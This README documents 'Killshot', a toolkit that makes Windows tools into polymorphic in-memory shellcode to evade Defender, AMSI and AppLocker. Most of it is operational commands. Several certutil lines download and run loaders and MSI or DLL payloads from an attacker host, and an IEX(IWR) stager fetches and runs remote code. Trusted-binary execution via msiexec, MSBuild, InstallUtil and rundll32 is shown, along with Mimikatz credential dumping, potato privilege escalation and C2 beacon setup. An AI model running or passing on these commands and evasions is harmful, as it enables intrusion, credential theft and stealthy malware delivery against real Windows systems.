# Killshot

Polymorphic AV/AMSI bypass toolkit. Converts any Windows PE or .NET tool into
in-memory shellcode that bypasses Defender on fully-patched Windows 11 24H2.

## How It Works

```
PE/.NET binary ──► Donut (shellcode) ──► base64 (.enc) ──► runner.exe loads in-memory
                                                              │
                                              ETW patched ────┘
                                              RW→RX memory
                                              Randomized injection method
                                              Polymorphic per build

Sliver beacon ──► shellcode (.bin) ──► MSI custom action DLL ──► msiexec /qn
                                          │                         │
                                          │  (>1MB: staged loader)  │
                                          │  Downloads XOR'd        │
                                          │  shellcode at runtime   │
                                          └─────────────────────────┘
```

Every invocation produces unique binaries — randomized variable names, API string
splits, junk functions, and multiple injection methods (CreateThread, EnumWindows
callback, CreateFiber). Runner.exe patches ETW before execution to blind telemetry.

## Quick Start

```bash
# 1. Install (downloads tools + sets up compilers)
./install.sh

# 2. Generate everything (outputs to ./killshot/)
killshot generate --all -l 10.10.14.5

# 3. Serve files
killshot serve

# 4a. On target — Runner (any .enc payload)
certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
%TEMP%\r.exe -remote http://10.10.14.5:8000/implant.enc

# 4b. On target — MSI (AppLocker bypass, no runner needed)
certutil -urlcache -split -f http://10.10.14.5:8000/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
```

## Toolkit

| Script | Purpose |
|---|---|
| `install.sh` | Downloads tools, installs Go 1.25.x/Donut/garble, verifies everything |
| `killshot.sh` | Main generator — component-based payload generation |
| `killshot.py` | Converts individual tools to Donut shellcode |
| `gen_runner.py` | Generates polymorphic Go shellcode loader |
| `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
| `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
| `gen_tool_stager.py` | Generates PowerShell in-memory loaders (fallback) |
| `gen_msi.py` | MSI/DLL AppLocker bypass — embedded or staged (WinHTTP download) |
| `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |

## Usage

All operations go through a single `killshot` command. Output goes to `./killshot/` under the current working directory.

```bash
# Info & verification
killshot help                                           # Show help
killshot list                                           # List available tools
killshot check                                          # Verify installation
killshot serve                                          # HTTP server for ./killshot/

# Generate specific components (mix and match)
killshot generate --runner                              # Polymorphic runner.exe only
killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
killshot generate --implant -l 10.10.14.5 --proto http  # Sliver HTTP beacon
killshot generate --stager                              # PowerShell stager with AMSI bypass
killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
killshot generate --tool Certify                        # Single tool (default params)
killshot generate --tools                               # All tools to shellcode
killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
killshot generate --loaders                             # PowerShell tool loaders

# AppLocker bypass payloads (requires implant shellcode)
killshot generate --msi                                 # MSI for msiexec (auto-detects staged)
killshot generate --msbuild                             # MSBuild XML inline C# task
killshot generate --installutil                         # InstallUtil C# source

# Generate everything at once
killshot generate --all -l 10.10.14.5
```

### Generate Options

| Flag | Default | Description |
|---|---|---|
| `-l, --lhost` | `10.99.0.16` | Callback/listener IP |
| `-p, --lport` | `4444` | C2 listener port |
| `-h, --http` | `8000` | HTTP file server port |
| `-f, --framework` | `sliver` | `sliver` or `msf` |
| `-t, --type` | `beacon` | `beacon` or `session` (Sliver) |
| `--proto` | `mtls` | `mtls`, `http`, or `https` (Sliver) |
| `-c, --cmd` | auto | Custom command for potatoes |
| `--params` | defaults | Custom params for `--tool` |
| `-o, --output` | auto | Output path for `--tool`/`--potato` |

### MSI Generation (standalone)

`gen_msi.py` can be used directly for fine-grained control:

```bash
# Embedded mode — shellcode baked into DLL (small payloads <1MB)
python3 gen_msi.py -i shellcode.bin -o update.msi

# Staged mode — DLL downloads XOR'd shellcode from URL at runtime (large payloads)
python3 gen_msi.py --url http://10.10.14.5:8000/beacon.bin -i implant.bin -o update.msi
# This creates update.msi (20KB) + beacon.bin (XOR'd shellcode to serve via HTTP)

# DLL only (for rundll32 or trusted path injection)
python3 gen_msi.py -i shellcode.bin -o loader.dll --dll-only

# Custom options
python3 gen_msi.py -i shellcode.bin -o update.msi --name "Windows Update" --xor-key 42
```

When using `killshot generate --msi`, staged mode is selected automatically if the shellcode exceeds 1MB (typical for Sliver beacons ~19MB).

### install.sh

```bash
./install.sh              # Full install
./install.sh --update     # Update all tools to latest versions
./install.sh --tools-only # Only download tool binaries
./install.sh --check      # Verify installation
```

## Included Tools

### Credential Access
| Tool | Description | Default Params |
|---|---|---|
| Rubeus | Kerberos abuse | `triage` |
| Mimikatz | Credential extraction | `privilege::debug sekurlsa::logonpasswords exit` |
| SharpDPAPI | DPAPI credential extraction | `triage` |
| SharpChrome | Chrome saved credentials | `logins` |

### Enumeration
| Tool | Description | Default Params |
|---|---|---|
| SharpHound | BloodHound AD collector | `-c All --memcache` |
| Certify | AD CS certificate abuse | `find /vulnerable` |
| Seatbelt | Host security survey | `-group=all -full` |
| winPEAS | Privilege escalation scanner | `quiet` |

### Privilege Escalation
| Tool | Description | Default Params |
|---|---|---|
| SharpUp | Privesc checks (GhostPack) | `audit` |
| GodPotato | SeImpersonate → SYSTEM | Baked stager command |
| PrintSpoofer | SeImpersonate → SYSTEM | Baked stager command |
| BadPotato | SeImpersonate → SYSTEM | Baked stager command |
| EfsPotato | SeImpersonate → SYSTEM | Baked stager command |
| KrbRelayUp | Kerberos relay privesc | `relay` |

### Lateral Movement & Tunneling
| Tool | Description | Default Params |
|---|---|---|
| Ligolo-ng agent | Tunneling agent | `-connect LHOST:11601 -ignore-cert` |
| Chisel | Tunnel client | `client LHOST:8443 R:socks` |

### Active Directory
| Tool | Description | Default Params |
|---|---|---|
| Whisker | Shadow Credentials attack | `list` |

## On-Target Usage

### Runner (polymorphic loader for any .enc payload)
```powershell
# Download runner once
certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\r.exe

# Run any tool
%TEMP%\r.exe -remote http://LHOST:PORT/implant.enc
%TEMP%\r.exe -remote http://LHOST:PORT/rubeus.enc
%TEMP%\r.exe -remote http://LHOST:PORT/mimikatz.enc
%TEMP%\r.exe -remote http://LHOST:PORT/seatbelt.enc
%TEMP%\r.exe -remote http://LHOST:PORT/godpotato.enc

# Or local file
%TEMP%\r.exe -local C:\path\to\payload.enc

# Or use the stager (AMSI bypass + auto-download runner + load implant)
IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
```

### MSI (AppLocker bypass — no runner needed)
```powershell
# Embedded MSI (small shellcode baked in)
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn

# Staged MSI (large shellcode like Sliver beacons)
# 1. Serve beacon.bin + update.msi via HTTP
# 2. On target:
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
# MSI automatically downloads shellcode from the URL baked into the DLL
```

### Other AppLocker Bypasses
```powershell
# MSBuild — download XML, execute via trusted .NET binary
certutil -urlcache -split -f http://LHOST:PORT/build.xml %TEMP%\b.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\b.xml

# InstallUtil — download CS, compile on target, execute via trusted binary
certutil -urlcache -split -f http://LHOST:PORT/service.cs %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\s.dll %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\s.dll

# DLL via rundll32
certutil -urlcache -split -f http://LHOST:PORT/update.dll %TEMP%\u.dll
rundll32.exe %TEMP%\u.dll,DllRegisterServer 0
```

## Evasion Techniques

- **Polymorphic runner** — unique binary each build (random identifiers, junk functions, API string splits)
- **ETW patching** — patches `EtwEventWrite` to `ret` before shellcode execution
- **Multiple injection methods** — randomly selects CreateThread, EnumWindows callback, or CreateFiber
- **RW→RX memory** — allocates as read-write, copies shellcode, then flips to read-execute
- **Sandbox detection** — timing check catches accelerated sleep in sandboxes
- **Donut shellcode** — position-independent shellcode from any PE/.NET, runs entirely in-memory
- **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
- **Garble compilation** — Go binary obfuscation (requires Go 1.25.x)
- **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
- **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
- **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode
- **Staged MSI loader** — 20KB MSI downloads XOR'd shellcode via WinHTTP at runtime (avoids embedding 19MB beacon)
- **MSI trusted binary** — executed by msiexec.exe (Microsoft-signed, AppLocker-whitelisted)

## Directory Structure

```
avbypass/
├── install.sh            # Installer (caps Go at 1.25.x for garble)
├── killshot.sh           # Main payload generator
├── killshot.py           # Tool-to-shellcode converter
├── gen_runner.py         # Polymorphic runner generator
├── gen_stager.py         # PowerShell stager generator
├── gen_potato.py         # Potato privesc generator
├── gen_msi.py            # MSI/DLL AppLocker bypass (embedded + staged)
├── gen_applocker.py      # MSBuild/InstallUtil AppLocker bypass
├── gen_tool_stager.py    # Tool loader generator
├── go.mod / go.sum       # Go module (cached for offline)
├── tools/
│   ├── potatoes/         # Potato exploit binaries
│   └── windows/          # Offensive tool binaries
└── go/                   # Local Go 1.25.x toolchain (after install)
```

Generated output (`./killshot/` under CWD):
```
killshot/
├── runner.exe            # Polymorphic loader (unique per build)
├── implant.enc           # Base64 shellcode for runner
├── update.msi            # MSI AppLocker bypass (~20KB)
├── beacon.bin            # XOR'd shellcode for staged MSI (if >1MB)
├── stager.ps1            # PowerShell stager
├── build.xml             # MSBuild AppLocker bypass
├── service.cs            # InstallUtil AppLocker bypass
├── *.enc                 # Tool shellcode files (rubeus.enc, etc.)
└── *.enc                 # Potato shellcode files
```

## Requirements

| Component | Required | Purpose |
|---|---|---|
| Python 3 | Yes | Runs all generators |
| Go 1.25.x | Yes | Cross-compiles runner.exe (1.26+ breaks garble) |
| donut-shellcode | Yes | PE-to-shellcode conversion |
| garble | Yes | Go binary obfuscation |
| mingw-w64 | Yes | DLL cross-compilation (MSI/AppLocker) |
| msibuild (msitools) | Optional | MSI packaging (falls back to DLL-only) |
| Sliver or MSF | Yes* | C2 implant generation |

*Only needed for implant generation. Tools work independently via `killshot.py`.

## Tested On

- Windows 11 24H2 (Build 26200) — Defender ON + cloud protection level 2
  - MSI bypass: Sliver beacon callback confirmed via msiexec.exe
  - Runner bypass: Sliver beacon callback confirmed via runner.exe
  - All injection methods (CreateThread, EnumWindows, CreateFiber) functional
- Windows Server 2022 — Defender with default settings
